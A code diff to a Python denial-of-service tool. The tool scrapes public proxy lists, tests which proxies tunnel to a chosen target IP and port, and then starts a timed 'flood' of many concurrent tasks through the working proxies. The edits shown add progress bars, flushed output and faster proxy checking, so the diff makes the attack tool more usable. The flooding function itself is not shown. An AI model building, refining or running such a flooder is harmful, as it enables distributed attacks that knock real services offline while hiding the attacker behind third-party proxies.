@@ -25,48 +25,50 @@ VALID_PROXIES = []
 
 def scrape_proxies():
     proxies = []
-    for url in PROXY_SOURCES:
+    for i, url in enumerate(PROXY_SOURCES):
         try:
             req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
             data = urllib.request.urlopen(req, timeout=15).read().decode()
             found = re.findall(r'(\d+\.\d+\.\d+\.\d+):(\d+)', data)
             proxies.extend([f"{ip}:{port}" for ip, port in found])
-            print(f"[SCRAPE] {len(found)} from {url.split('/')[2]}")
+            print(f"[SCRAPE] {i+1}/{len(PROXY_SOURCES)} {len(found)} from {url.split('/')[2]}", flush=True)
         except Exception as e:
-            print(f"[SCRAPE] FAIL {url.split('/')[2]}: {e}")
+            print(f"[SCRAPE] {i+1}/{len(PROXY_SOURCES)} FAIL {url.split('/')[2]}: {e}", flush=True)
     proxies = list(set(proxies))
-    print(f"[SCRAPE] Total unique: {len(proxies)}")
+    print(f"[SCRAPE] Total unique: {len(proxies)}", flush=True)
     return proxies
 
-async def check_proxy(proxy_str, target_ip, target_port, timeout=5):
+async def check_proxy(proxy_str, target_ip, target_port, timeout=3):
     try:
         ip, port = proxy_str.split(":")
         s = socket.socket()
         s.settimeout(timeout)
         s.connect((ip, int(port)))
-        req = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
-        s.send(req.encode())
-        resp = b""
-        while b"\r\n\r\n" not in resp:
-            resp += s.recv(1024)
+        s.send(f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n".encode())
+        resp = s.recv(256)
         s.close()
-        if b"200" in resp:
-            return proxy_str
+        return proxy_str if resp.startswith(b"HTTP/1.1 200") else None
     except:
-        pass
-    return None
+        return None
 
 async def check_all_proxies(proxies, target_ip, target_port):
     valid = []
-    batch_size = 300
-    for i in range(0, len(proxies), batch_size):
+    batch_size = 200
+    total = len(proxies)
+    start = time.time()
+    for i in range(0, total, batch_size):
         batch = proxies[i:i+batch_size]
         tasks = [check_proxy(p, target_ip, target_port) for p in batch]
         results = await asyncio.gather(*tasks)
         for r in results:
             if r:
                 valid.append(r)
-        print(f"[CHECK] {i+len(batch)}/{len(proxies)} -> {len(valid)} valid", end="\r")
+        elapsed = time.time() - start
+        pct = min((i+batch_size)/total*100, 100)
+        bar = "█" * int(pct // 5) + "░" * (20 - int(pct // 5))
+        rate = (i+batch_size)/max(elapsed, 0.1)
+        eta = (total-(i+batch_size))/max(rate, 1)
+        print(f"\r[CHECK] |{bar}| {pct:.0f}% {len(valid)} valid | {rate:.0f}/s | ETA {eta:.0f}s", end="", flush=True)
     print()
     return valid
 
@@ -133,19 +135,19 @@ async def main_async():
     if len(sys.argv) >= 5:
         TEST_DURATION = int(sys.argv[4])
 
-    print(f"[FLOOD] {TASK_COUNT}tasks x{PAYLOAD_SIZE}B -> {TARGET_IP}:{TARGET_PORT} {TEST_DURATION}s")
-    print("[1/3] Scraping proxies...")
+    print(f"[FLOOD] {TASK_COUNT}tasks x{PAYLOAD_SIZE}B -> {TARGET_IP}:{TARGET_PORT} {TEST_DURATION}s", flush=True)
+    print("[1/3] Scraping proxies...", flush=True)
     proxies = scrape_proxies()
     if not proxies:
-        print("[FAIL] No proxies scraped"); return
+        print("[FAIL] No proxies scraped", flush=True); return
 
-    print("[2/3] Checking proxies against target...")
+    print("[2/3] Checking proxies against target...", flush=True)
     VALID_PROXIES = await check_all_proxies(proxies, TARGET_IP, TARGET_PORT)
     if not VALID_PROXIES:
-        print("[FAIL] No working proxies found"); return
-    print(f"[OK] {len(VALID_PROXIES)} working proxies")
+        print("[FAIL] No working proxies found", flush=True); return
+    print(f"[OK] {len(VALID_PROXIES)} working proxies", flush=True)
 
-    print("[3/3] Starting flood...")
+    print("[3/3] Starting flood...", flush=True)
     stop = asyncio.Event()
     tasks = [asyncio.create_task(flood_proxy(stop, VALID_PROXIES)) for _ in range(TASK_COUNT)]
     start = time.time()
